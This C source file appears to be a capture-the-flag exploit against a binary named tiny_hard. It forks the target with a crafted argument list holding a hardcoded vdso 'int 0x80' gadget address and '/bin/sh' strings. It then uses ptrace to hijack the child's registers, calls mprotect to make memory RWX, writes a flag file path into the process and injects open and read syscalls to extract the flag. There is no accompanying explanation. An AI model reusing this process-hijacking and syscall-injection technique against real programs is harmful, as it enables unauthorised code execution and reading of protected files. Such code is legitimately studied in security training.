#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>


#define VDSO_START (0xf7755000) // changes due to ASLR, low entropy. Example start
#define int80_offest (0xb57) // remote offset to int 0x80 gadget on the vdso
#define INT80 (0xf7742b57)
// 0xf7742b57

int run_syscall(pid_t pid, int syscall_number, int first_paramter, int second_parameter, int third_paramter) {
    struct user_regs_struct regs = { 0 };
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    regs.eip = INT80;
    regs.eax = syscall_number;
    regs.ebx = first_paramter;
    regs.ecx = second_parameter;
    regs.edx = third_paramter;
    ptrace(PTRACE_SETREGS, pid, 0, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
}

char address[] = { 0x57, 0x2b, 0x74, 0xf7 }; // another legit address
char *ARG = "/bin/sh";


void run_bash_with_ptrace(pid_t pid) {
//printf("Parents starts waiting..\n");
int status;
wait(&status);
//printf("Wait status: %d\n", status);
if (status < 200)
{return;
}
// printf("Now doing second wait....\n");
    
//	wait(&status);
//printf("Parent done waiting, Status: %d\n");
struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
if (regs.eip == 0xf7742b59){
	printf("BINGOOOOOOOOOOOOOOOOO\n\n\n\n\n\nBINGO\n");
} 
    printf("Registers values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);
	printf("EIP points to:\n");
	long text = ptrace(PTRACE_PEEKTEXT, pid, regs.eip, 0);
printf("text: %p\n", text);
regs.eip = 0x08048074;
regs.eax = 11;
regs.ebx = regs.esp;
regs.ecx = regs.esp;
regs.edx = regs.esp;
ptrace(PTRACE_SETREGS, pid, 0, &regs);
ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
wait(&status);

ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("[*]Single stepped..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

run_syscall(pid, 125, 0x8048000, 0x1000, 7); // change permissions to RWX
wait(&status);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("[*]Syscall was made..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

ptrace(PTRACE_POKETEXT, pid, 0x8048200, 0x6d6f682f);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 4, 0x69742f65);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 8, 0x685f796e);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 12, 0x2f647261);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 16, 0x67616c66);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 20, 0x5f73695f);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 24, 0x685f6e69);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 28, 0x00657265);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 32, 0x00000000);
run_syscall(pid, 5, 0x8048200, O_RDONLY, 0); // OPEN
wait(NULL);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
int flag_fd = regs.eax;
printf("Open syscall worked, flag fd: %d\n", flag_fd);

run_syscall(pid, 3, flag_fd, 0x8048400, 20); // READ
wait(NULL);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("read %d bytes\n",  regs.eax);

long text = ptrace(PTRACE_PEEKTEXT, pid, 0x8048400, 0);
printf("text: %p\n", text);


}



void main(void) {

    pid_t pid = fork();
    if (-1 == pid) {
        perror("fork");
        return;
    }

    if (0 == pid) {
    	//printf("[*] Child entered\n");
        execl("/home/tiny_hard/tiny_hard", address, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, NULL);
        perror("execl");
    }
    else {
	//printf("[*] Parent entered. Child pid: %d\n", pid);
        run_bash_with_ptrace(pid);
    }
}
